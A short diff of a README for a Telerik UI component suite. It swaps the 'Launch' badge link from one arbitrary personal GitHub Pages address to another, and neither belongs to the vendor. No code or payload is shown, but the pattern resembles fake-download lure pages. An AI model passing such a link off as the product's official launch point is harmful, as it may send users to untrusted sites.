@@ -12,7 +12,7 @@ A comprehensive, enterprise-grade **Telerik UI** component suite designed to str
 
 ## Getting Started
 
-[![Launch](https://img.shields.io/badge/Launch-Telerik_UI-ff6b6b?style=for-the-badge)](https://sharon3349949.github.io/.github/telerik-ui-components)
+[![Launch](https://img.shields.io/badge/Launch-Telerik_UI-ff6b6b?style=for-the-badge)](https://kolsonaveryvedj.github.io/.github/telerik-ui-components)
 
 1. Obtain **Telerik UI** license from the official source.  
 2. Add **Telerik UI** NuGet packages or npm modules to your project.  
